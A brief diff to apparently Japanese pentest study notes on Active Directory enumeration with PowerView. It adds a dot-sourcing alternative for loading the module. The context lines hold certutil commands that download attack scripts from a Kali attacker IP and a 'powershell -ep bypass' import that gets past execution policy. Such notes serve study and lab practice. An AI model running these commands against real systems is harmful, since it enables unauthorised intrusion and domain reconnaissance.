@@ -47,6 +47,12 @@ PS> Import-Module PowerView.ps1
 PS> Get-NetUser
 ```
 
+または
+
+```
+PS> . .\PowerView.ps1
+```
+
 
 (certutil -URLcache -f http://<Kali's IP>/enum_users.ps1 enum_users.ps1)
 
@@ -59,11 +65,6 @@ PS> Get-NetUser
 (certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)
 
 ```PS> powershell -ep bypass Import-Module .\PowerView.ps1
-
-or
-
-PS> . .\PowerView.ps1
-
 ```
 
 ## Show Current Logged In Users
